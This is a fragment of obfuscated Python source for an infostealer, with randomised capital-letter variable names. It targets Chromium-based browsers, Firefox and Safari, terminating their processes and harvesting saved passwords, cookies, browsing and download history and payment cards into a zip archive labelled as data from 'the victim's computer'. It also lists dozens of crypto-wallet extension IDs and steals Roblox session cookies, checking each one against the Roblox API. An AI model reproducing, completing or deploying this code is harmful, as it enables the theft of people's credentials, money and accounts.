        ("Orbitum",                os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    ZOVEYYUBFEORKYUEINKVYBNGFHJRZAICOGUEIROEGKVHRISJPLDSXVEYCCJ = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    UNIDCENPNJMPAFIWZDKZNCFSMFWVDLBUFKSABECJSITQTTWIRJTKBI = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r_proc_name in ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r_proc_name in ZCIYYJEEVFGTINTFKWHQJGNZBLTINMDOMPATZBLHBMCLPVCOOAHCHIGMA_files:
        if not os.path.exists(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL):
            continue

        SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG = FHVXIUGRBFTKKHTHTUZBDASSOEJUAOMSNVSWOIRYSOWUWXRJUSPOIDPWAGYMZPQCIGOARRNFMYKGAFZCX(os.path.join(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, 'Local State'))
        if not SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG:
            continue

        for v4r_profile in ZOVEYYUBFEORKYUEINKVYBNGFHJRZAICOGUEIROEGKVHRISJPLDSXVEYCCJ:
            RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS = os.path.join(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r_profile)
            if not os.path.exists(RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS):
                continue

        for v4r_profile in ZOVEYYUBFEORKYUEINKVYBNGFHJRZAICOGUEIROEGKVHRISJPLDSXVEYCCJ:
            RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS = os.path.join(LBITFYWUWSRAMXKXXNATPBNVXLXSEVRCRFNMKYOUIYCMVLWDYTCAXJKALUIHHGL, v4r_profile)
            if not os.path.exists(RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS):
                continue
            
            if "extentions" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
                try: AVXOGSZPSWLESMOOQPIIDONVHJKLPLKDMAACGEAAREFDDYHWQTPWPCYQKQKKSBSWAATTZSBOWFHQMBPQZZRCANZXKIDPWXPID(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT, UNIDCENPNJMPAFIWZDKZNCFSMFWVDLBUFKSABECJSITQTTWIRJTKBI, MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS)
                except: pass
                
            if "passwords" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
                try: NRWPWSSNWJWEKBDNSMZCSOPCFQBAXIQAZETZPJHWETFSYKIEUGUSOODHHAZTHCX(MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG)
                except: pass
            if "cookies" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
                try: TLXGLIRMRCTLRKVAGUDIUUKFJFLSTQUSTVFDRHAMZHVGQZAPVEIXHTMXGCVLWTOSNVZJEFNVFHGDORCXUMJZOJUWZIMXM(MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG)
                except: pass
            if "history" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
                try: TUMEXLPGYGXDUXPWCACRDYWEFNXIOZKWVDDLRGCUEGGVCCKIDHGAOBIZSZDEYOCOWUCLGHFQUV(MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS)
                except: pass
            if "downloads" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
                try: PJOKKZTWDAIRMTZZBBAXSEEYJOBVQFDXRLBPYVIYAYOWAPHONKHDUYUPZSCIRJHCU(MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS)
                except: pass
            if "cards" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
                try: SQWFRJSUODLCMVICZGPLKFUFBXMWNELBHMKMCDKJATYHXQADXEHWCTFZCKEAJRKBGAXFQ(MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB, RPOOCICOJSINOBOAKSXYOFAXOUBRXLCGPOQTRBSGTBMBIUXFBWWYCUNFEKUGYKGYPIHFZBASSBCSAFWEVMIXITLZDYGEOXS, SYOTYMKULEJQDFMYXTAIBXTRCFGZCLUWNHHAGUTJQDQSDSCTYIKFVDZIBSPNETWZWFTXNNRQFKRTYEEFNMAUJYSAAJG)
                except: pass

            if MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB not in FPKJUSKHHWZJDAYYSHWCWDJIWWXCLYBDAOVSWXTQWBNNLOKFSWFUPSJXNKVTSBLQUYJGPSCMDH:
                FPKJUSKHHWZJDAYYSHWCWDJIWWXCLYBDAOVSWXTQWBNNLOKFSWFUPSJXNKVTSBLQUYJGPSCMDH.append(MTEICAGYEZYSVMYGTWDTBYWFGTWJMANLLGOAWDPXKHJOOPXFLRNHAQZYGDMEPRDFXJAOFSVZURVINPBTMCTTPMRJB)

    if "passwords" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        if not QBZAZASIRSKVHSCFJFYDGGDRQDGVZFYXBMMTCKOBDEVEOBBHNTZIAAQNFOHMTCXOMNTL:
            QBZAZASIRSKVHSCFJFYDGGDRQDGVZFYXBMMTCKOBDEVEOBBHNTZIAAQNFOHMTCXOMNTL.append("No passwords was saved on the victim's computer.")
        QBZAZASIRSKVHSCFJFYDGGDRQDGVZFYXBMMTCKOBDEVEOBBHNTZIAAQNFOHMTCXOMNTL = "\n".join(QBZAZASIRSKVHSCFJFYDGGDRQDGVZFYXBMMTCKOBDEVEOBBHNTZIAAQNFOHMTCXOMNTL)
    if "cookies" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        if not LJNWTMPJUYKNBZOQFGSIDNEGJMPTULLATLOZNJPBLZHIWRUYDICYSOVAQHED:
            LJNWTMPJUYKNBZOQFGSIDNEGJMPTULLATLOZNJPBLZHIWRUYDICYSOVAQHED.append("No cookies was saved on the victim's computer.")
        LJNWTMPJUYKNBZOQFGSIDNEGJMPTULLATLOZNJPBLZHIWRUYDICYSOVAQHED   = "\n".join(LJNWTMPJUYKNBZOQFGSIDNEGJMPTULLATLOZNJPBLZHIWRUYDICYSOVAQHED)
    if "history" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        if not SUSAZYQOINBPOGNYFWLKTTITFXXDYTYHQSQYAZADPWLWMTKXVHERPVTPO:
            SUSAZYQOINBPOGNYFWLKTTITFXXDYTYHQSQYAZADPWLWMTKXVHERPVTPO.append("No history was saved on the victim's computer.")
        SUSAZYQOINBPOGNYFWLKTTITFXXDYTYHQSQYAZADPWLWMTKXVHERPVTPO   = "\n".join(SUSAZYQOINBPOGNYFWLKTTITFXXDYTYHQSQYAZADPWLWMTKXVHERPVTPO)
    if "downloads" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        if not WTNAAOGQMEASFKRXLTOGGBLMLXJJYSWYNQGEVKCAUXDNHGGSZUSQWDOUCONQWBBBRQOPHBAXRDXAJRYULNSUGURMWIBQITWDZX:
            WTNAAOGQMEASFKRXLTOGGBLMLXJJYSWYNQGEVKCAUXDNHGGSZUSQWDOUCONQWBBBRQOPHBAXRDXAJRYULNSUGURMWIBQITWDZX.append("No downloads was saved on the victim's computer.")
        WTNAAOGQMEASFKRXLTOGGBLMLXJJYSWYNQGEVKCAUXDNHGGSZUSQWDOUCONQWBBBRQOPHBAXRDXAJRYULNSUGURMWIBQITWDZX = "\n".join(WTNAAOGQMEASFKRXLTOGGBLMLXJJYSWYNQGEVKCAUXDNHGGSZUSQWDOUCONQWBBBRQOPHBAXRDXAJRYULNSUGURMWIBQITWDZX)
    if "cards" in RAQNRETNIDQZAHSFDQETSRGSZBOHDQVNQCGQVGRRTPOPMDKGVAPUWDX:
        if not TMTIRXJTEBSJCQTLKXXOBOMFLZFYOSSTGCHVZKLQJMFITHYIZRTMQSZJYWGRMTPXRTLSQYTSTBEGMKX:
            TMTIRXJTEBSJCQTLKXXOBOMFLZFYOSSTGCHVZKLQJMFITHYIZRTMQSZJYWGRMTPXRTLSQYTSTBEGMKX.append("No cards was saved on the victim's computer.")
        TMTIRXJTEBSJCQTLKXXOBOMFLZFYOSSTGCHVZKLQJMFITHYIZRTMQSZJYWGRMTPXRTLSQYTSTBEGMKX     = "\n".join(TMTIRXJTEBSJCQTLKXXOBOMFLZFYOSSTGCHVZKLQJMFITHYIZRTMQSZJYWGRMTPXRTLSQYTSTBEGMKX)
    
    if LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA != None:
        TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr(f"Passwords ({LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA}).txt", QBZAZASIRSKVHSCFJFYDGGDRQDGVZFYXBMMTCKOBDEVEOBBHNTZIAAQNFOHMTCXOMNTL)

    if KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ != None:
        TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr(f"Cookies ({KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ}).txt", LJNWTMPJUYKNBZOQFGSIDNEGJMPTULLATLOZNJPBLZHIWRUYDICYSOVAQHED)

    if UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD != None:
        TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr(f"Cards ({UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD}).txt", TMTIRXJTEBSJCQTLKXXOBOMFLZFYOSSTGCHVZKLQJMFITHYIZRTMQSZJYWGRMTPXRTLSQYTSTBEGMKX)

    if MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM != None:
        TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr(f"Browsing History ({MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM}).txt", SUSAZYQOINBPOGNYFWLKTTITFXXDYTYHQSQYAZADPWLWMTKXVHERPVTPO)

    if KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT != None:
        TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr(f"Download History ({KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT}).txt",WTNAAOGQMEASFKRXLTOGGBLMLXJJYSWYNQGEVKCAUXDNHGGSZUSQWDOUCONQWBBBRQOPHBAXRDXAJRYULNSUGURMWIBQITWDZX)

    return YGIBLHTDRVQNOCHHJQRJEYIYXRPUMFUHJEJLDCLNFTIDJENPCUHLFBMIDE, LKBCYLQEPSFLGYSCXQTSAGGYRDSCOKIIFLTSZCDMUZABBEZPGLXZQDFPDHRFA, KPJCZPMHWOLVYOVTWNGSGWGKJJMRTXSWXNUJATBDZFFFYRPLSMAGTDLSRPIFLERURMJRDGWQ, MGQZGSYOCFJWGMRFEPKARHHUCLVPKLEYZZZKCAXRZLVWRJRVZGKPSMOUJAFHANUZHOIDXYQKKVOEIMBHTGQIOLWWOPCYDYYJQSKM, KCHISRMRZLGZUXKGQLTZCKFMFMZJRHHCGXSREIGJEEEUBMAUBXKDLLDZJLLJLSKOFKKDZVDODDGBRTTOEUHIWLQT, UPICLMNZOKXZJWYGDKKRFSERVKNDCTKHDRNXTMLZHQTNMMMYKRZLD

def DIBGEOWRGKSEAFMXIFUVRDOCXAULLPLZUFQLJSPMITIPBEXUUDYJZRNKYMKYHXZALUWORJQPEHOHOQLVVYJ(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    import browser_cookie3
    import requests
    import json

    BOXYOEUOYMVVTKUIXFKVRERPKDTQQNYPXRRAPEJRTXCXOXNONFVJZIRASJP = ""
    LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ = 0
    QEHTAKIEJIBWQSESENIZRAKLJJINTVFLZCIVMYNZMATMQKRDGVZKHTRSUTMMJSVEEAVUDAMHHLOQRVZNSWQYPMHYY = []
    

    def BMHYRYEGWXSSWPMKXVCAXFDWMJDLHMIHKGBQXOCRHWSZXXDATBKWJ(YWOEVYOMCTTCRTVZKMPEFRYWVTGUSEZVNTXAHMEUCLHPDUFWOZOJPRJFQHMFDMZWZCJJOBSBXJYQ):
        try:
            DRZAFZJWPIDWXIEEYLEZMXRDYTVAYZRPMTATFVWFJZRNXWIMTHLKELWMGXWYJDOSMBYN = YWOEVYOMCTTCRTVZKMPEFRYWVTGUSEZVNTXAHMEUCLHPDUFWOZOJPRJFQHMFDMZWZCJJOBSBXJYQ()
            DRZAFZJWPIDWXIEEYLEZMXRDYTVAYZRPMTATFVWFJZRNXWIMTHLKELWMGXWYJDOSMBYN = str(DRZAFZJWPIDWXIEEYLEZMXRDYTVAYZRPMTATFVWFJZRNXWIMTHLKELWMGXWYJDOSMBYN)
            PLVRUKTDSYNMKGCWFMUOUYOIOXVGQCNIQTKQKBEKJKYNRXDYFSIMUVDLZAVVL = DRZAFZJWPIDWXIEEYLEZMXRDYTVAYZRPMTATFVWFJZRNXWIMTHLKELWMGXWYJDOSMBYN.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            SLOBDQVPDRTFOCXHQEJJJYYIINANTSLVFIRHKYYNTEBGOGZHZTUOIGFYGKGWJFRLGDJRPRFQAOCOFCFLBZFYNJSUF = YWOEVYOMCTTCRTVZKMPEFRYWVTGUSEZVNTXAHMEUCLHPDUFWOZOJPRJFQHMFDMZWZCJJOBSBXJYQ.__name__
            return PLVRUKTDSYNMKGCWFMUOUYOIOXVGQCNIQTKQKBEKJKYNRXDYFSIMUVDLZAVVL, SLOBDQVPDRTFOCXHQEJJJYYIINANTSLVFIRHKYYNTEBGOGZHZTUOIGFYGKGWJFRLGDJRPRFQAOCOFCFLBZFYNJSUF
        except:
            return None, None

    def MicrosoftEdge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def GoogleChrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def OperaGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    XKKNFICHQWMGWVISOIHPTUPYVNJTAGNYLATBIKMXTTWSAZZRPGEETOEG = [MicrosoftEdge, GoogleChrome, Firefox, Opera, OperaGX, Safari, Brave]
    for v4r_br0ws3r in XKKNFICHQWMGWVISOIHPTUPYVNJTAGNYLATBIKMXTTWSAZZRPGEETOEG:
        v4r_c00ki3, SLOBDQVPDRTFOCXHQEJJJYYIINANTSLVFIRHKYYNTEBGOGZHZTUOIGFYGKGWJFRLGDJRPRFQAOCOFCFLBZFYNJSUF = BMHYRYEGWXSSWPMKXVCAXFDWMJDLHMIHKGBQXOCRHWSZXXDATBKWJ(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in QEHTAKIEJIBWQSESENIZRAKLJJINTVFLZCIVMYNZMATMQKRDGVZKHTRSUTMMJSVEEAVUDAMHHLOQRVZNSWQYPMHYY:
                LVBHSDGVISAOFNXECQVBSNZGYAEHZWBEUYEUAWNKCRWUWZITSCTXWXFIVUULQLDOHIUUJYUSKCCPXUPXBZ += 1
                QEHTAKIEJIBWQSESENIZRAKLJJINTVFLZCIVMYNZMATMQKRDGVZKHTRSUTMMJSVEEAVUDAMHHLOQRVZNSWQYPMHYY.append(v4r_c00ki3)
                try:
                    LIEJRTNCUPTHHWZMDGIAQXYWHSXZSSCVKWUFHHZAFVGLGACBCNSD = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY = json.loads(LIEJRTNCUPTHHWZMDGIAQXYWHSXZSSCVKWUFHHZAFVGLGACBCNSD.text)
                except:
                    DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY = {"None": "None"}

                MYGDIUSFLLONNCRLPVEXIOFIWBEEELSNADNMNNDNAMAKDAEPZUXC = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('id', "None")
                COHNIUOQUHXIUYBXBBEROCZWXJVRBTQFRXNMLSLDTUVVGGKISYGRRPBDXVLRRLSYYXELCFRIUOEYHBFDFUQZDXFYAUTVPLE = DIMIGGHAPAATHRCRTAFDEXZZWFQIJCJBLTEXATQEIQOHIAHTQHHY.get('displayName', "None")
